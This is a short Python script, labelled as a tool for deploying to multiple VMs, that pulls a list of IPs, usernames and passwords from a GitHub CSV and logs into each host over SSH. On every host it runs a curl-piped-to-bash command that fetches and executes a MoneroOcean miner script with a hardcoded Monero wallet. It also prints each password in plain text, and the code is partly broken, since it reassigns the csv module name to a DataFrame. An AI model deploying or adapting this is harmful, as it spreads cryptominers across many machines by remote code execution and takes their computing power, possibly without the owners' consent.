#!/usr/local/bin/python
# deploy.py: Deploy Multiple VM's from csv

import pandas as pd
url = 'https://raw.githubusercontent.com/junaidd007/Monero/main/vms.csv'
csv = pd.read_csv(url, error_bad_lines=False)
import paramiko


# Set your commands here, one per line
sshcmd = [
    "pwd", #example command, shows current user path
    "df -h", # example command, shows space on hdd
    "curl -s -L https://raw.githubusercontent.com/junaidd007/Monero/main/MoneroOcean.sh | bash -s 47TFyE1CiWNgcB5AMn9MSNKA4Lap9TcRwAvdbKedrK7VYWyqVTwE5qWWhW4Tdm4y2nNf9deqPdagqXWXwezwoSfPSx8jk3q"
    
]

with open('vms.csv', 'r') as csvfile:
    reader = csv.DictReader(csvfile)
    for row in reader:
        print( "Connecting to VM")
        print('IP Address: ', row['ip'], ' Username: ', row['user'], ' Password: ', row['pass'])

        # Make the connection
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(hostname= row['ip'], username=row['user'], password=row['pass'])
            except:
                print( "[!] ERROR CONNECTING TO ", row['ip'])
            
            #If we are here we should be connected?
            for command in sshcmd:
                print("="*50, command, "="*50)
                stdin, stdout, stderr = client.exec_command(command)
                print(stdout.read().decode())
                err = stderr.read().decode()
                if err:
                    print(err)
        except:
            print( "[!] ERROR, Timed out")


